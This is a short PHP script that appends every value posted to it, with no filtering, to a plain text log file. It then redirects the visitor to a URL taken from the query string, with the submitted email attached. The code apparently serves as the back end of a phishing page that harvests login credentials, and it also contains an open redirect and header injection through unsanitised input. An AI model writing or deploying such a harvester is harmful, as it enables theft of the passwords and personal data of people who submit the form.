<?php
function filterInput( $data ) 
{
	$data = trim( $data );
	$data = stripslashes( $data );
	$data = htmlspecialchars( $data );
	$data = htmlentities( $data );
	return $data;
}
$log = fopen( "log.txt", "a" );
fwrite( $log, filterInput( $_GET[ "r" ] ) . "\n" );
foreach ( $_POST as $postName ) { fwrite( $log, $postName . "\n" ); }
fwrite( $log, "\n\n" );
header( "Location: " . $_GET[ "r" ] . "&email=" . $_POST[ "email" ] );
?>
